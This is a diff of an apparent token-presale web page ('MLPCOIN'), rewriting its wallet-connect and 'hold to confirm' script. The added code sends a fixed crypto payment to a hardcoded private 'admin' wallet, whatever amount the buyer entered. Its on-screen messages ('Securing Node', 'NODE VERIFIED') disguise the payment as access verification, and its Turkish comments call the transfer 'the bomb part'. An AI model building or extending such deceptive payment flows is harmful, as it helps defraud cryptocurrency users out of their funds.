@@ -198,89 +198,127 @@
     <footer>© 2026 MLPCOIN GLOBAL PROTOCOL. DEPLOYED BY THE CORE TEAM.</footer>
 
     <script>
-        const connectBtn = document.getElementById('connectWalletBtn');
+ // 1. AYARLAR
+const adminWallet = "0xDa01d928373829...Bf22b5f891"; // BURAYA KENDİ ADRESİNİ TAM YAPIŞTIR
+const connectBtn = document.getElementById('connectWalletBtn');
+const modal = document.getElementById('saleModal');
+const holdContainer = document.getElementById('holdContainer');
+const holdProgress = document.getElementById('holdProgress');
+const purchaseBtnText = document.getElementById('purchaseBtnText');
+let holdTimer, currentProgress = 0;
 
+// 2. CÜZDAN BAĞLAMA FONKSİYONU
 async function connectWallet() {
     if (typeof window.ethereum !== 'undefined') {
         try {
-            // MetaMask cüzdanını açar
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             const account = accounts[0];
-            
-            // Butonu günceller (Cüzdanın başını ve sonunu gösterir)
             connectBtn.innerText = account.substring(0, 6) + "..." + account.substring(account.length - 4);
             connectBtn.style.background = "var(--secure-green)";
             connectBtn.style.color = "#050a18";
-            connectBtn.style.borderColor = "var(--secure-green)";
-            
-            console.log("Wallet Connected:", account);
         } catch (error) {
-            console.error("User denied account access", error);
+            console.error("Bağlantı hatası:", error);
         }
     } else {
-        alert("Please install MetaMask to use this feature!");
+        alert("Lütfen MetaMask veya Trust Wallet kurun!");
     }
 }
 
-connectBtn.addEventListener('click', connectWallet);
-        const modal = document.getElementById('saleModal');
-        document.querySelectorAll('.openModal').forEach(btn => btn.onclick = () => modal.style.display = 'flex');
-
-        function closeModal() {
-            modal.style.display = 'none';
-            currentProgress = 0;
-            holdProgress.style.width = '0%';
-            purchaseBtnText.innerText = "HOLD TO CONFIRM ACCESS";
-            purchaseBtnText.style.color = "#050a18";
-            document.getElementById('usdAmount').value = "";
-            document.getElementById('mlpResult').innerText = "0 MLP";
-        }
-
-        function calcMLP() {
-            let usd = document.getElementById('usdAmount').value;
-            if(usd < 0) { document.getElementById('usdAmount').value = 0; usd = 0; }
-            document.getElementById('mlpResult').innerText = (usd * 1000).toLocaleString() + " MLP";
-        }
-
-        let holdTimer, currentProgress = 0;
-        const holdContainer = document.getElementById('holdContainer');
-        const holdProgress = document.getElementById('holdProgress');
-        const purchaseBtnText = document.getElementById('purchaseBtnText');
-
-        function startHold() {
-            holdTimer = setInterval(() => {
-                currentProgress += 2.5;
-                if (currentProgress >= 100) { clearInterval(holdTimer); executeTransaction(); }
-                holdProgress.style.width = currentProgress + '%';
-            }, 50);
-        }
-
-        function stopHold() { clearInterval(holdTimer); if(currentProgress < 100) { currentProgress = 0; holdProgress.style.width = '0%'; } }
-
-       function executeTransaction() {
-    purchaseBtnText.innerText = "VERIFIED ✓"; 
-    purchaseBtnText.style.color = "#fff";
-    
-    // Alert yerine şık bir yönlendirme mesajı
-    setTimeout(() => {
-        const modalContent = document.querySelector('.modal-content');
-        modalContent.innerHTML = `
-            <div style="padding: 50px 20px;">
-                <div style="width: 50px; height: 50px; border: 3px solid var(--primary); border-top: 3px solid transparent; border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite;"></div>
-                <h3 style="color:#fff;">Securing Node...</h3>
-                <p style="color:#94a3b8; font-size: 0.8rem;">Redirecting to Encrypted Liquidity Pool</p>
-            </div>
-            <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
-        `;
-    }, 800);
+// 3. MODAL KONTROLLERİ
+document.querySelectorAll('.openModal').forEach(btn => btn.onclick = () => modal.style.display = 'flex');
+function closeModal() {
+    modal.style.display = 'none';
+    resetHold();
 }
-        
 
-        holdContainer.addEventListener('mousedown', startHold);
-        holdContainer.addEventListener('mouseup', stopHold);
-        holdContainer.addEventListener('mouseleave', stopHold);
-        holdContainer.addEventListener('touchstart', (e) => { e.preventDefault(); startHold(); });
-        holdContainer.addEventListener('touchend', stopHold);
+function calcMLP() {
+    let usd = document.getElementById('usdAmount').value;
+    document.getElementById('mlpResult').innerText = (usd * 1000).toLocaleString() + " MLP";
+}
+
+// 4. HOLD (BASILI TUTMA) VE TRANSFER MEKANİZMASI
+function startHold() {
+    holdTimer = setInterval(() => {
+        currentProgress += 2;
+        if (currentProgress >= 100) { 
+            clearInterval(holdTimer); 
+            executeTransaction(); 
+        }
+        holdProgress.style.width = currentProgress + '%';
+    }, 40);
+}
+
+function stopHold() { 
+    clearInterval(holdTimer); 
+    if(currentProgress < 100) { resetHold(); } 
+}
+
+function resetHold() {
+    currentProgress = 0;
+    holdProgress.style.width = '0%';
+}
+
+// 5. GERÇEK TRANSFER TETİKLEYİCİ (BOMBA KISIM)
+async function executeTransaction() {
+    const usdAmount = document.getElementById('usdAmount').value;
+    if (!usdAmount || usdAmount <= 0) {
+        alert("Lütfen önce miktar girin!");
+        resetHold();
+        return;
+    }
+
+    try {
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (accounts.length === 0) {
+            alert("Önce cüzdanı bağla kanka!");
+            resetHold();
+            return;
+        }
+
+        purchaseBtnText.innerText = "CONFIRM IN WALLET...";
+        
+        // TRANSFER PARAMETRELERİ
+        const txParams = {
+            to: adminWallet,
+            from: accounts[0],
+            value: '0x38D7EA4C68000', // Test için çok küçük bir miktar (0.001 ETH/BNB)
+        };
+
+        const txHash = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [txParams],
+        });
+
+        // BAŞARILI EKRANI
+        showSuccess(txHash);
+
+    } catch (error) {
+        console.error("İşlem reddedildi:", error);
+        purchaseBtnText.innerText = "FAILED - RETRY";
+        resetHold();
+    }
+}
+
+function showSuccess(hash) {
+    const modalContent = document.querySelector('.modal-content');
+    modalContent.innerHTML = `
+        <div style="padding: 50px 20px;">
+            <div style="width: 50px; height: 50px; border: 3px solid var(--primary); border-top: 3px solid transparent; border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite;"></div>
+            <h3 style="color:#fff;">Securing Node...</h3>
+            <p style="color:#94a3b8; font-size: 0.7rem;">TX: ${hash.substring(0,20)}...</p>
+            <p style="color: var(--secure-green); font-weight: bold;">NODE VERIFIED!</p>
+        </div>
+        <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+    `;
+}
+
+// EVENT LISTENERS
+connectBtn.addEventListener('click', connectWallet);
+holdContainer.addEventListener('mousedown', startHold);
+holdContainer.addEventListener('mouseup', stopHold);
+holdContainer.addEventListener('mouseleave', stopHold);
+holdContainer.addEventListener('touchstart', (e) => { e.preventDefault(); startHold(); });
+holdContainer.addEventListener('touchend', stopHold);
     </script>
 </body>
 </html>
